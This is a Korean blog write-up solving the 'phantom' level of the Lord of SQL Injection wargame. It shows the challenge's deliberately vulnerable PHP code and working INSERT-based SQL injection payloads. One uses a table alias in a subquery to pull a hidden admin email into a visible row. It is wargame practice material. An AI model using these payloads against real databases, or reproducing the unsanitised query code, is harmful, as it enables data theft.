---
title: "[Lord of SQL Injection] LoS - phantom 문제풀이"
date: 2018-09-16
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

이번엔 유령이다 유령
`phantom` 이라는 문제인데 Write-up은 `The Phantom Of The Opera` 들으면서 써야겠다.  

<!--more-->

코드는 다음과 같다.  

|     ip    |      email     |
|:---------:|:--------------:|
| 127.0.0.1 | ************** |

```php
<?php
  include "./config.php";
  login_chk();
  dbconnect("phantom");

  if($_GET['joinmail']){
    $query = "insert into prob_phantom values(0,'{$_SERVER[REMOTE_ADDR]}','{$_GET[joinmail]}')";
    mysql_query($query);
    echo "<hr>query : <strong>{$query}</strong><hr>";
  }

  $rows = mysql_query("select no,ip,email from prob_phantom where no=1 or ip='{$_SERVER[REMOTE_ADDR]}'");
  echo "<table border=1><tr><th>ip</th><th>email</th></tr>";
    while(($result = mysql_fetch_array($rows))){
    if($result['no'] == 1) $result['email'] = "**************";
    echo "<tr><td>{$result[ip]}</td><td>{$result[email]}</td></tr>";
  }
  echo "</table>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_phantom where no=1 and email='{$_GET[email]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['email']) && ($result['email'] === $_GET['email'])){ mysql_query("delete from prob_phantom where no != 1"); mysql_query("alter table prob_phantom AUTO_INCREMENT=2"); solve("phantom"); }
  highlight_file(__FILE__);
?>
```

보면 `joinmail`이라는 이름으로 가입 할(?) 이메일 주소를 입력 받는다.
그리고 현재 데이터베이스에 저장되어 있는 값 중, `no=1`인 값과 내 IP 주소와 같은 주소로 저장되어 있는 행을 `select` 해 출력 해 준다.
이 때, `no=1`인 행의 `email` 주소는 `**************`로 바뀌어 출력된다.
문제를 풀기 위해서는 `no=1`인 행의 `email`의 주소를 정확하게 알아내면 된다.
`joinmail`에서 테스트를 해 보았더니, 넘어온 값에 대해 제대로 검증을 하지 않아 한번에 여러 행을 추가할 수 있다는 사실을 알아냈다.  

```plain
?joinmail=test1'), (2, 'MY IP', 'test2
```

이렇게 입력하면 완성되는 쿼리는 아래와 같다.  

```mysql
insert into prob_phantom values(0,'MY IP','test1'), (2, 'MY IP', 'test2')
```

그 결과 한번에 `test1`과 `test2`가 저장된 것을 확인할 수 있다.
그래서 처음에는 `no=1`인 행을 덮어 쓰면 되지 않을까 생각했다.
근데 `no` 자리에 `1`을 넣어서 시도 해 보면 아예 쿼리가 먹히지 않았다.
아무래도 뭔가 설정 상으로 막아둔 것 같았다.
그래서 그 다음 방법으로는 `insert`문에 `select`로 `subquery`를 넣어 `no=1`인 행의 `email`을 뽑아 새로운 행으로 저장하는 방법을 생각했다.
처음에 문법을 제대로 몰라서 좀 삽질을 했다.
내 서버에서 테스트를 좀 했었는데, `ERROR 1093 (HY000): You can't specify target table 'user' for update in FROM clause` 이런 오류가 계속 났다.
알고보니 현재 테이블에서 값을 뽑아 현재 테이블의 값으로 저장하는 것은 안된다고 한다.
예를 들어, 아래와 같은 `insert`문을 작성했다고 가정하자.  

```mysql
insert into user value('id1', 'pw1'), ('id2', (select pw from user where id='admin'));
```

이 경우, `user`라는 테이블에 `user` 테이블에서 값을 추출 해 삽입하기 때문에 위와 같은 `1093`에러가 발생한다.
이 때 간단한 해결 방법이 있는데, 바로 `select` 문에서 테이블 명에 별칭을 주는 것이다.  

```mysql
insert into user value('id1', 'pw1'), ('id2', (select pw from user tmp where id='admin'));
```

위와 같이 `select pw from user`를 `select pw from user tmp`로 바꾸면 에러가 발생하지 않는다.
이를 바탕으로 쿼리문을 아래와 같이 구성했다.  

```plain
?joinmail=test'), (3, '210.126.104.194', (select email from prob_phantom tmp where no=1))#
```

그 결과 평문으로 된 `no=1`인 행의 `email` 주소를 얻을 수 있었다.  

|     ip    |            email           |
|:---------:|:--------------------------:|
| 127.0.0.1 | **************             |
| MY IP     | admin_secure_email@debu.kr |
| MY IP     |            test            |

이제 이메일을 구했으니, `?email=admin_secure_email@debu.kr`을 쿼리스트링으로 넘기면 문제를 풀 수 있다.  

```php
PHANTOM Clear!
<?php
  include "./config.php";
  login_chk();
  dbconnect("phantom");

  if($_GET['joinmail']){
    $query = "insert into prob_phantom values(0,'{$_SERVER[REMOTE_ADDR]}','{$_GET[joinmail]}')";
    mysql_query($query);
    echo "<hr>query : <strong>{$query}</strong><hr>";
  }

  $rows = mysql_query("select no,ip,email from prob_phantom where no=1 or ip='{$_SERVER[REMOTE_ADDR]}'");
  echo "<table border=1><tr><th>ip</th><th>email</th></tr>";
    while(($result = mysql_fetch_array($rows))){
    if($result['no'] == 1) $result['email'] = "**************";
    echo "<tr><td>{$result[ip]}</td><td>{$result[email]}</td></tr>";
  }
  echo "</table>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_phantom where no=1 and email='{$_GET[email]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['email']) && ($result['email'] === $_GET['email'])){ mysql_query("delete from prob_phantom where no != 1"); mysql_query("alter table prob_phantom AUTO_INCREMENT=2"); solve("phantom"); }
  highlight_file(__FILE__);
?>
```

---

```plain
PHANTOM Clear!!
```